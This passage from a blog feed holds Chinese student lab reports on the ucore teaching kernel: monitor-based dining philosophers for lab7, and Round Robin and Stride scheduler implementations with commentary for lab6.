cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”</span>, cvp, cvp<span class="hljs-subst">-&gt;</span>count, cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count);<br>}</code></pre><br><hr><br><p>可以看出如果进程A执行了cond_wait函数，表示此进程等待某个条件C不为真，需要睡眠。因此表示等待此条件的睡眠进程个数cv.count要加一。接下来会出现两种情况。 <br><br>情况一：如果monitor.next_count如果大于0，表示有大于等于1个进程执行cond_signal函数且睡着了，就睡在了monitor.next信号量上。假定这些进程形成S进程链表。因此需要唤醒S进程链表中的一个进程B。然后进程A睡在cv.sem上，如果睡醒了，则让cv.count减一，表示等待此条件的睡眠进程个数少了一个，可继续执行。 <br><br>情况二：如果monitor.next_count如果小于等于0，表示目前没有进程执行cond_signal函数且睡着了，那需要唤醒的是由于互斥条件限制而无法进入管程的进程，所以要唤醒睡在monitor.mutex上的进程。然后进程A睡在cv.sem上，如果睡醒了，则让cv.count减一，表示等待此条件的睡眠进程个数少了一个，可继续执行了！<br><br></p><br><p>这样我们就可以在此基础上继续完成哲学家就餐问题的解决了，主要是就是如下的两个函数：</p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">void</span> phi_take_forks_condvar(<span class="hljs-keyword">int</span> i) {<br>     down(&amp;(mtp-&gt;mutex));  <span class="hljs-comment">//通过P操作进入临界区</span><br>      state_condvar[i]=HUNGRY; <span class="hljs-comment">//记录下哲学家i是否饥饿，即处于等待状态拿叉子</span><br>      phi_test_condvar(i);<br>      <span class="hljs-keyword">while</span> (state_condvar[i] != EATING) {<br>          cprintf(<span class="hljs-string">“phi_take_forks_condvar: %d didn’t get fork and will wait\n”</span>,i);<br>          cond_wait(&amp;mtp-&gt;cv[i]);<span class="hljs-comment">//如果得不到叉子就睡眠</span><br>      }<br>      <span class="hljs-comment">//如果存在睡眠的进程则那么将之唤醒</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>}<br><br><span class="hljs-keyword">void</span> phi_put_forks_condvar(<span class="hljs-keyword">int</span> i) {<br>     down(&amp;(mtp-&gt;mutex));<span class="hljs-comment">//通过P操作进入临界区</span><br><br>      state_condvar[i]=THINKING;<span class="hljs-comment">//记录进餐结束的状态</span><br>      phi_test_condvar(LEFT);<span class="hljs-comment">//看一下左边哲学家现在是否能进餐</span><br>      phi_test_condvar(RIGHT);<span class="hljs-comment">//看一下右边哲学家现在是否能进餐</span><br>      <span class="hljs-comment">//如果有哲学家睡眠就予以唤醒</span><br>     <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>        up(&amp;(mtp-&gt;next));<br>     <span class="hljs-keyword">else</span><br>        up(&amp;(mtp-&gt;mutex));<br>}</code></pre><br><h1 id="实验截图">实验截图</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630214154220?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630214249392?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>实验成功<br></p><br><h1 id="实验感悟">实验感悟</h1><br><p>本次实验使我对互斥以及同步有了更深的认识， 实验七提供了多种同步互斥手段，包括中断控制、等待队列、信号量、管程机制（包含条件变量设计）等，并基于信号量实现了哲学家问题的执行过程。而练习是要求用管程机制实现哲学家问题的执行过程。使得学到的知识得到了实践。下一步还是要提高自己的动手能力。  </p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;练习0填写已有实验练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题0x0 哲学家问题0x1 信号量介绍0x2 P操作V操作实现0x3 代码分析0x4 信号量性质练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题0x1 管程机制0x2 数据结构0x3 组成函数实验截图练习0:填写已有实验使用meld的软件进行对比即可  这里把需要填充的文件罗列如下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="操作系统实验" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实验报告 lab6</title>
    <link href="http://yoursite.com/2017/06/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab6/"/>
    <id>http://yoursite.com/2017/06/12/操作系统实验报告 lab6/</id>
    <published>2017-06-11T18:47:00.000Z</published>
    <updated>2017-10-22T02:14:28.843Z</updated>
    
    <content type="html"><![CDATA[<p>练习0 填写已有实验meld的软件进行对比即可 现在将需要修改的文件罗列如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.c根据注释的提示，主要是一下两个函数需要额外加以修改。alloc_proc函数 完整代码如下：static struct proc_struct *alloc<em>proc(void) {    struct proc</em><br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#练习0-填写已有实验">练习0 填写已有实验</a></li><br><li><a href="#练习1-使用round-robin调度算法">练习1 使用Round Robin调度算法</a><ul><br><li><a href="#0x1-执行过程">0x1 执行过程</a></li><br><li><a href="#0x2-算法实现">0x2 算法实现</a></li><br></ul><br></li><br><li><a href="#练习2-实现stride-scheduling调度算法">练习2 实现Stride Scheduling调度算法</a></li><br><li><a href="#实验结果">实验结果</a></li><br><li><a href="#实验心得">实验心得</a></li><br></ul><br></div><br></div><br></p><br><h1 id="练习0-填写已有实验">练习0 填写已有实验</h1><br><p>meld的软件进行对比即可 <br><br>现在将需要修改的文件罗列如下：<br></p><br><pre class="prettyprint"><code class=" hljs avrasm">proc<span class="hljs-preprocessor">.c</span><br>default_pmm<span class="hljs-preprocessor">.c</span><br>pmm<span class="hljs-preprocessor">.c</span><br>swap_fifo<span class="hljs-preprocessor">.c</span><br>vmm<span class="hljs-preprocessor">.c</span><br>trap<span class="hljs-preprocessor">.c</span></code></pre><br><p>根据注释的提示，主要是一下两个函数需要额外加以修改。</p><br><hr><br><p><strong>alloc_proc函数</strong> <br><br>完整代码如下：<br></p><br><pre class="prettyprint"><code class=" hljs lasso">static struct proc_struct <span class="hljs-subst"><em></em></span><br>alloc_proc(<span class="hljs-literal">void</span>) {<br>    struct proc_struct <span class="hljs-subst"></span>proc <span class="hljs-subst">=</span> kmalloc(sizeof(struct proc_struct));<br>    <span class="hljs-keyword">if</span> (proc <span class="hljs-subst">!=</span> <span class="hljs-built_in">NULL</span>) {<br>        proc<span class="hljs-subst">-&gt;</span>state <span class="hljs-subst">=</span> PROC_UNINIT; <span class="hljs-comment">//设置进程初始状态</span><br>        proc<span class="hljs-subst">-&gt;</span>pid <span class="hljs-subst">=</span> <span class="hljs-subst">-</span><span class="hljs-number">1</span>;            <span class="hljs-comment">//进程id=-1</span><br>        proc<span class="hljs-subst">-&gt;</span>runs <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;            <span class="hljs-comment">//初始化时间片为0</span><br>        proc<span class="hljs-subst">-&gt;</span>kstack <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;          <span class="hljs-comment">//初始化内存栈的地址为0</span><br>        proc<span class="hljs-subst">-&gt;</span>need_resched <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">//是否需要调度设为不需要</span><br>        proc<span class="hljs-subst">-&gt;</span><span class="hljs-keyword">parent</span> <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;       <span class="hljs-comment">//将父节点置空</span><br>        proc<span class="hljs-subst">-&gt;</span>mm <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;           <span class="hljs-comment">//置空虚拟内存</span><br>        memset(<span class="hljs-subst">&amp;</span>(proc<span class="hljs-subst">-&gt;</span>context), <span class="hljs-number">0</span>, sizeof(struct context));<span class="hljs-comment">//初始化上下文</span><br>        proc<span class="hljs-subst">-&gt;</span>tf <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;           <span class="hljs-comment">//将中断帧指针置空</span><br>        proc<span class="hljs-subst">-&gt;</span>cr3 <span class="hljs-subst">=</span> boot_cr3;      <span class="hljs-comment">//将页目录设内核页目录表的基址</span><br>        proc<span class="hljs-subst">-&gt;</span>flags <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;           <span class="hljs-comment">//初始化标志位</span><br>        memset(proc<span class="hljs-subst">-&gt;</span>name, <span class="hljs-number">0</span>, PROC_NAME_LEN);<span class="hljs-comment">//置空进程名</span><br>        proc<span class="hljs-subst">-&gt;</span>wait_state <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;      <span class="hljs-comment">//初始化进程等待状态  </span><br>        proc<span class="hljs-subst">-&gt;</span>cptr<span class="hljs-subst">=</span>proc<span class="hljs-subst">-&gt;</span>yptr<span class="hljs-subst">=</span>proc<span class="hljs-subst">-&gt;</span>optr <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;<span class="hljs-comment">//初始化进程相关指针  </span><br>        proc<span class="hljs-subst">-&gt;</span>rq <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;<span class="hljs-comment">//置空运行队列 </span><br>        list_init(<span class="hljs-subst">&amp;</span>(proc<span class="hljs-subst">-&gt;</span>run_link));<span class="hljs-comment">//初始化运行队列的指针</span><br>        proc<span class="hljs-subst">-&gt;</span>time_slice <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;      <span class="hljs-comment">//初始化时间片</span><br>        proc<span class="hljs-subst">-&gt;</span>lab6_run_pool<span class="hljs-built_in">.</span>left <span class="hljs-subst">=</span> proc<span class="hljs-subst">-&gt;</span>lab6_run_pool<span class="hljs-built_in">.</span>right <span class="hljs-subst">=</span> proc<span class="hljs-subst">-&gt;</span>lab6_run_pool<span class="hljs-built_in">.</span><span class="hljs-keyword">parent</span> <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>; <span class="hljs-comment">//初始化各类指针为空</span><br>        proc<span class="hljs-subst">-&gt;</span>lab6_stride <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">//初始化当前运行步数</span><br>        proc<span class="hljs-subst">-&gt;</span>lab6_priority <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;   <span class="hljs-comment">//初始化优先级</span><br>    }<br>    <span class="hljs-keyword">return</span> proc;<br>}</code></pre><br><hr><br><p>相比于lab5，lab6对proc_struct结构体再次做了扩展，这里主要是多出了以下部分</p><br><pre class="prettyprint"><code class=" hljs lasso"><br>    proc<span class="hljs-subst">-&gt;</span>rq <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;             <span class="hljs-comment">//初始化运行队列为空</span><br>    list_init(<span class="hljs-subst">&amp;</span>(proc<span class="hljs-subst">-&gt;</span>run_link));<span class="hljs-comment">//初始化运行队列的指针</span><br>    proc<span class="hljs-subst">-&gt;</span>time_slice <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;        <span class="hljs-comment">//初始化时间片</span><br>    proc<span class="hljs-subst">-&gt;</span>lab6_run_pool<span class="hljs-built_in">.</span>left <span class="hljs-subst">=</span> proc<span class="hljs-subst">-&gt;</span>lab6_run_pool<span class="hljs-built_in">.</span>right proc<span class="hljs-subst">-&gt;</span>lab6_run_pool<span class="hljs-built_in">.</span><span class="hljs-keyword">parent</span> <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>; <span class="hljs-comment">//初始化各类指针为空，包括父进程等待</span><br>    proc<span class="hljs-subst">-&gt;</span>lab6_stride <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;       <span class="hljs-comment">//步数初始化 </span><br>    proc<span class="hljs-subst">-&gt;</span>lab6_priority <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">//初始化优先级</span></code></pre><br><hr><br><p><strong>trap_dispatch</strong>函数</p><br><pre class="prettyprint"><code class=" hljs lasso">static <span class="hljs-literal">void</span><br>trap_dispatch(struct trapframe <span class="hljs-subst"><em></em></span>tf) {<br>    <span class="hljs-attribute">…</span><span class="hljs-attribute">…</span><br>    <span class="hljs-attribute">…</span><span class="hljs-attribute">…</span><br>    ticks <span class="hljs-subst">++</span>;<br>    assert(current <span class="hljs-subst">!=</span> <span class="hljs-built_in">NULL</span>);<br>    run_timer_list(); <span class="hljs-comment">//更新定时器，并根据参数调用调度算法  </span><br>    break;<br>    <span class="hljs-attribute">…</span><span class="hljs-attribute">…</span><br>    <span class="hljs-attribute">…</span><span class="hljs-attribute">…</span><br>}</code></pre><br><h1 id="练习1-使用round-robin调度算法">练习1 使用Round Robin调度算法</h1><br><blockquote><br><p>理解并分析sched_calss中各个函数指针的用法，并接合Round Robin 调度算法描ucore的调度执行过程</p><br></blockquote><br><h2 id="0x1-执行过程">0x1 执行过程</h2><br><blockquote><br><p>让所有runnable态的进程分时轮流使用CPU时间。RR调度器维护当前runnable进程的有序运行队列。当前进程的时间片用完之后，调度器将当前进程放置到运行队列的尾部，再从其头部取出进程进行调度。RR调度算法的就绪队列在组织结构上也是一个双向链表，只是增加了一个成员变量，表明在此就绪进程队列中的最大执行时间片。而且在进程控制块proc_struct中增加了一个成员变量time_slice，用来记录进程当前的可运行时间片段。这是由于RR调度算法需要考虑执行进程的运行时间不能太长。在每个timer到时的时候，操作系统会递减当前执行进程的time_slice，当time_slice为0时，就意味着这个进程运行了一段时间（这个时间片段称为进程的时间片），需要把CPU让给其他进程执行，于是操作系统就需要让此进程重新回到rq的队列尾，且重置此进程的时间片为就绪队列的成员变量最大时间片max_time_slice值，然后再从rq的队列头取出一个新的进程执行。</p><br></blockquote><br><h2 id="0x2-算法实现">0x2 算法实现</h2><br><p><strong>RR_init完成了对进程队列的初始化</strong></p><br><pre class="prettyprint"><code class=" hljs cs">    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>    RR_init(<span class="hljs-keyword">struct</span> run_queue rq) {<br>        list_init(&amp;(rq-&gt;run_list));<br>        rq-&gt;proc_num = <span class="hljs-number">0</span>;<br>    }  </code></pre><br><hr><br><p><strong>RR_enqueue的函数实现如下表所示。即把某进程的进程控制块指针放入到rq队列末尾，且如果进程控制块的时间片为0，则需要把它重置为rq成员变量max_time_slice。这表示如果进程在当前的执行时间片已经用完，需要等到下一次有机会运行时，才能再执行一段时间。</strong></p><br><pre class="prettyprint"><code class=" hljs haskell">    static void<br>    <span class="hljs-type">RR_enqueue</span>(struct run_queue <em>rq, struct proc_struct </em><span class="hljs-keyword">proc</span>) {<br>        assert(list_empty(&amp;(<span class="hljs-keyword">proc</span>-&gt;run_link)));<br>        list_add_before(&amp;(rq-&gt;run_list), &amp;(<span class="hljs-keyword">proc</span>-&gt;run_link));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">proc</span>-&gt;time_slice == <span class="hljs-number">0</span> || <span class="hljs-keyword">proc</span>-&gt;time_slice &gt; rq-&gt;max_time_slice) {<br>            <span class="hljs-keyword">proc</span>-&gt;time_slice = rq-&gt;max_time_slice;<br>        }<br>        <span class="hljs-keyword">proc</span>-&gt;rq = rq;<br>        rq-&gt;proc_num ++;<br>    }  </code></pre><br><hr><br><p><strong>RR_dequeue的函数实现如下表所示。即把就绪进程队列rq的进程控制块指针的队列元素删除，并把表示就绪进程个数的proc_num减一。</strong></p><br><pre class="prettyprint"><code class=" hljs haskell">    static void<br>    <span class="hljs-type">RR_dequeue</span>(struct run_queue <em>rq, struct proc_struct </em><span class="hljs-keyword">proc</span>) {<br>        assert(!list_empty(&amp;(<span class="hljs-keyword">proc</span>-&gt;run_link)) &amp;&amp; <span class="hljs-keyword">proc</span>-&gt;rq == rq);<br>        list_del_init(&amp;(<span class="hljs-keyword">proc</span>-&gt;run_link));<br>        rq-&gt;proc_num <span class="hljs-comment">–;  </span><br>    }  </code></pre><br><hr><br><p><strong>RR_pick_next的函数实现如下表所示。即选取就绪进程队列rq中的队头队列元素，并把队列元素转换成进程控制块指针。</strong></p><br><pre class="prettyprint"><code class=" hljs objectivec">    <span class="hljs-keyword">static</span> <span class="hljs-keyword">struct</span> proc_struct <em><br>    RR_pick_next(<span class="hljs-keyword">struct</span> run_queue </em>rq) {<br>        list_entry_t <em>le = list_next(&amp;(rq-&gt;run_list));<br>        <span class="hljs-keyword">if</span> (le != &amp;(rq-&gt;run_list)) {<br>            <span class="hljs-keyword">return</span> le2proc(le, run_link);<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    }  </em></code></pre><br><hr><br><p><strong>RR_proc_tick的函数实现如下表所示。即每次timer到时后，trap函数将会间接调用此函数来把当前执行进程的时间片time_slice减一。如果time_slice降到零，则设置此进程成员变量need_resched标识为1，这样在下一次中断来后执行trap函数时，会由于当前进程程成员变量need_resched标识为1而执行schedule函数，从而把当前执行进程放回就绪队列末尾，而从就绪队列头取出在就绪队列上等待时间最久的那个就绪进程执行。</strong></p><br><pre class="prettyprint"><code class=" hljs haskell"><span class="hljs-title">static</span> void <span class="hljs-type">RR_proc_tick</span>(struct run_queue rq, struct proc_struct <em><span class="hljs-keyword">proc</span>) {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">proc</span>-&gt;time_slice &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">proc</span>-&gt;time_slice <span class="hljs-comment">–;  </span><br>    }<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">proc</span>-&gt;time_slice == <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">proc</span>-&gt;need_resched = <span class="hljs-number">1</span>;<br>    }<br>}  </em></code></pre><br><h1 id="练习2-实现stride-scheduling调度算法">练习2 实现Stride Scheduling调度算法</h1><br><blockquote><br><p>首先需要换掉RR调度器的实现，即用default_sched_stride_c覆盖default_sched.c。然后根据此文件和后续文档对Stride度器的相关描述，完成Stride调度算法的实现。</p><br></blockquote><br><p>首先，根据实验指导书的要求，先用default_sched_stride_c覆盖default_sched.c，即覆盖掉Round Robin调度算法的实现。 <br><br>覆盖掉之后需要在该框架上实现Stride Scheduling调度算法。 <br><br>关于Stride Scheduling调度算法，经过查阅资料和实验指导书，我们可以简单的把思想归结如下：<br><br></p><br><pre><code>1、为每个runnable的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。<br>2、每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。<br>3、在一段固定的时间之后，回到步骤2，重新调度当前stride最小的进程<br></code></pre><br><p>首先是初始化函数stride_init。 <br><br>开始初始化运行队列，并初始化当前的运行队，然后设置当前运行队列内进程数目为0。<br></p><br><pre class="prettyprint"><code class=" hljs lasso">static <span class="hljs-literal">void</span><br>stride_init(struct run_queue <span class="hljs-subst"></span>rq) {<br>     <span class="hljs-comment">/<em> LAB6: YOUR CODE </em>/</span><br>     list_init(<span class="hljs-subst">&amp;</span>(rq<span class="hljs-subst">-&gt;</span>run_list));<br>     rq<span class="hljs-subst">-&gt;</span>lab6_run_pool <span class="hljs-subst">=</span> <span class="hljs-built_in">NULL</span>;<br>     rq<span class="hljs-subst">-&gt;</span>proc_num <span class="hljs-subst">=</span> <span class="hljs-number">0</span>;<br>}  </code></pre><br><hr><br><p>然后是入队函数stride_enqueue，根据之前对该调度算法的分析，这里函数主要是初始化刚进入运行队列的进程 proc 的stride属性，然后比较队头元素与当前进程的步数大小，选择步数最小的运行，即将其插入放入运行队列中去，这里并未放置在队列头部。最后初始化时间片，然后将运行队列进程数目加一。</p><br><pre class="prettyprint"><code class=" hljs haskell"><span class="hljs-title">static</span> void<br><span class="hljs-title">stride_enqueue</span>(struct run_queue <em>rq, struct proc_struct </em><span class="hljs-keyword">proc</span>) {<br>     /<em> <span class="hljs-type">LAB6</span>: <span class="hljs-type">YOUR</span> <span class="hljs-type">CODE</span> </em>/<br><span class="hljs-preprocessor">#if USE_SKEW_HEAP  </span><br>     rq-&gt;lab6_run_pool = //在使用优先队列的实现中表示当前优先队列的头元素<br>          skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(<span class="hljs-keyword">proc</span>-&gt;lab6_run_pool), proc_stride_comp_f);//比较队头元素与当前进程的步数大小，选择步数最小的运行<br><span class="hljs-preprocessor">#else  </span><br>     assert(list_empty(&amp;(<span class="hljs-keyword">proc</span>-&gt;run_link)));<br>     list_add_before(&amp;(rq-&gt;run_list), &amp;(<span class="hljs-keyword">proc</span>-&gt;run_link));//将 <span class="hljs-keyword">proc</span>插入放入运行队列中去<br><span class="hljs-preprocessor">#endif  </span><br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">proc</span>-&gt;time_slice == <span class="hljs-number">0</span> || <span class="hljs-keyword">proc</span>-&gt;time_slice &gt; rq-&gt;max_time_slice) {//初始化时间片<br>          <span class="hljs-keyword">proc</span>-&gt;time_slice = rq-&gt;max_time_slice;<br>     }<br>     <span class="hljs-keyword">proc</span>-&gt;rq = rq;<br>     rq-&gt;proc_num ++;<br>}  </code></pre><br><hr><br><p>然后是出队函数stride_dequeue，即完成将一个进程从队列中移除的功能，这里使用了优先队列。最后运行队列数目减一。</p><br><pre class="prettyprint"><code class=" hljs haskell"><span class="hljs-title">static</span> void<br><span class="hljs-title">stride_dequeue</span>(struct run_queue <em>rq, struct proc_struct </em><span class="hljs-keyword">proc</span>) {<br>     /<em> <span class="hljs-type">LAB6</span>: <span class="hljs-type">YOUR</span> <span class="hljs-type">CODE</span> </em>/<br><span class="hljs-preprocessor">#if USE_SKEW_HEAP  </span><br>     rq-&gt;lab6_run_pool =<br>          skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(<span class="hljs-keyword">proc</span>-&gt;lab6_run_pool), proc_stride_comp_f);// 在斜堆中删除相应元素<br><span class="hljs-preprocessor">#else  </span><br>     assert(!list_empty(&amp;(<span class="hljs-keyword">proc</span>-&gt;run_link)) &amp;&amp; <span class="hljs-keyword">proc</span>-&gt;rq == rq);<br>     list_del_init(&amp;(<span class="hljs-keyword">proc</span>-&gt;run_link));// 从运行队列中删除相应元素<br><span class="hljs-preprocessor">#endif  </span><br>     rq-&gt;proc_num <span class="hljs-comment">–;  </span><br>}  </code></pre><br><hr><br><p>接下来就是进程的调度函数stride_pick_next，观察代码，它的核心是先扫描整个运行队列，返回其中stride值最小的对应进程，然后更新对应进程的stride值，将步长设置为优先级的倒数，如果为0则设置为最大的步长。</p><br><pre class="prettyprint"><code class=" hljs lasso">static struct proc_struct <span class="hljs-subst"><em></em></span><br>stride_pick_next(struct run_queue <span class="hljs-subst"></span>rq) {<br>     <span class="hljs-comment">/<em> LAB6: YOUR CODE </em>/</span><br><span class="hljs-variable">#if</span> USE_SKEW_HEAP<br>     <span class="hljs-keyword">if</span> (rq<span class="hljs-subst">-&gt;</span>lab6_run_pool <span class="hljs-subst">==</span> <span class="hljs-built_in">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-built_in">NULL</span>;<br>     struct proc_struct <span class="hljs-subst"><em></em></span>p <span class="hljs-subst">=</span> le2proc(rq<span class="hljs-subst">-&gt;</span>lab6_run_pool, lab6_run_pool);<br><span class="hljs-variable">#else</span><br>     list_entry_t <span class="hljs-subst"></span>le <span class="hljs-subst">=</span> list_next(<span class="hljs-subst">&amp;</span>(rq<span class="hljs-subst">-&gt;</span>run_list));<br><br>     <span class="hljs-keyword">if</span> (le <span class="hljs-subst">==</span> <span class="hljs-subst">&amp;</span>rq<span class="hljs-subst">-&gt;</span>run_list)<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">NULL</span>;<br><br>     struct proc_struct <span class="hljs-subst"><em></em></span>p <span class="hljs-subst">=</span> le2proc(le, run_link);<br>     le <span class="hljs-subst">=</span> list_next(le);<br>     <span class="hljs-keyword">while</span> (le <span class="hljs-subst">!=</span> <span class="hljs-subst">&amp;</span>rq<span class="hljs-subst">-&gt;</span>run_list)<br>     {<br>          struct proc_struct <span class="hljs-subst"></span>q <span class="hljs-subst">=</span> le2proc(le, run_link);<br>          <span class="hljs-keyword">if</span> ((int32_t)(p<span class="hljs-subst">-&gt;</span>lab6_stride <span class="hljs-subst">-</span> q<span class="hljs-subst">-&gt;</span>lab6_stride) <span class="hljs-subst">&gt;</span> <span class="hljs-number">0</span>)<br>               p <span class="hljs-subst">=</span> q;<br>          le <span class="hljs-subst">=</span> list_next(le);<br>     }<br><span class="hljs-variable">#endif</span><br>    <span class="hljs-comment">//更新对应进程的stride值</span><br>     <span class="hljs-keyword">if</span> (p<span class="hljs-subst">-&gt;</span>lab6_priority <span class="hljs-subst">==</span> <span class="hljs-number">0</span>)<span class="hljs-comment">//优先级设置  </span><br>          p<span class="hljs-subst">-&gt;</span>lab6_stride <span class="hljs-subst">+=</span> BIG_STRIDE;<span class="hljs-comment">//步长为0则设置为最大步长保持相减的有效性  </span><br>     <span class="hljs-keyword">else</span> p<span class="hljs-subst">-&gt;</span>lab6_stride <span class="hljs-subst">+=</span> BIG_STRIDE <span class="hljs-subst">/</span> p<span class="hljs-subst">-&gt;</span>lab6_priority;<span class="hljs-comment">//步长设置为优先级的倒数  </span><br>     <span class="hljs-keyword">return</span> p;<br>}</code></pre><br><hr><br><p>函数stride_proc_tick的主要工作是检测当前进程的时间片是否已经用完。如果时间片已经用完,就会按照正确的流程进行进程的切换工作。这里和之前实现的Round Robin调度算法一样，所采用的思想也是一致的</p><br><p>优先队列比较函数proc_stride_comp_f的实现，主要利用思路是通过相减之后的值，进行判断大小</p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>proc_stride_comp_f(<span class="hljs-keyword">void</span> <em>a, <span class="hljs-keyword">void</span> </em>b)<br>{<br>     <span class="hljs-keyword">struct</span> proc_struct <em>p = le2proc(a, lab6_run_pool);<br>     <span class="hljs-keyword">struct</span> proc_struct </em>q = le2proc(b, lab6_run_pool);<br>     int32_t c = p-&gt;lab6_stride - q-&gt;lab6_stride;<span class="hljs-comment">//步数相减，通过正负比较大小关系  </span><br>     <span class="hljs-keyword">if</span> (c &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>}  </code></pre><br><h1 id="实验结果">实验结果</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630212834411?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630213052599?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h1 id="实验心得">实验心得</h1><br><p>通过这一次实验我对轮转法以及stride法有了更多的了解，stride法其实就是轮转法的一种升级。stride法加入了对进程优先级的调整，步数越小，进程优先级越大。这种改变更加合理。进程的调度极大的提高了CPU的利用率。更加深刻的理解了进程切换的原理，对Stride Schedule算法的原理和算法可控性和确定性有了更深的认识。</p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;练习0 填写已有实验meld的软件进行对比即可 现在将需要修改的文件罗列如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.c根据注释的提示，主要是一下两个函数需要额外加以修改。alloc_proc函数 完整代码如下：static struct proc_struct *alloc&lt;em&gt;proc(void) {    struct proc&lt;/em&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="操作系统实验" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实验报告 lab8</title>
    <link href="http://yoursite.com/2017/06/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab8/"/>
    <id>http://yoursite.com/2017/06/12/操作系统实验报告 lab8/</id>
    <published>2017-06-11T17:05:00.000Z</published>
    <updated>2017-10-22T02:14:29.263Z</updated>
    
